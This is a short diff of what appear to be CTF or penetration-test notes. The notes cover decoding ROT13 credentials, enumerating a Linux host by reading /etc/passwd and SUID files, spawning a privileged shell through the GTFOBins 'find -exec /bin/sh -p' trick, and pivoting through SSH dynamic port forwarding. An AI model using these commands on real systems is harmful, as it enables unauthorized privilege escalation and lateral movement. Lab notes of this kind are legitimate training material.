@@ -130,3 +130,6 @@ Rot13 the creds found, this gives you the passwords for the users you found for 
 (user credentials for account from ROT13 decode)
 #Enumerate new system, cat /etc/hosts, sudo -l, cat /etc/passwd, find / -type f -perm /6000 -ls 2>/dev/null
 Go to GTFObins -> Search find -> SUID method -> ./find . -exec /bin/sh -p \; -quit -> id 
+Pingsweep on this machine to look for windows box
+ssh -S /tmp/t1 t1 -O cancel -D 9050
+ssh -S /tmp/t2 t2 -O forward -D 9050
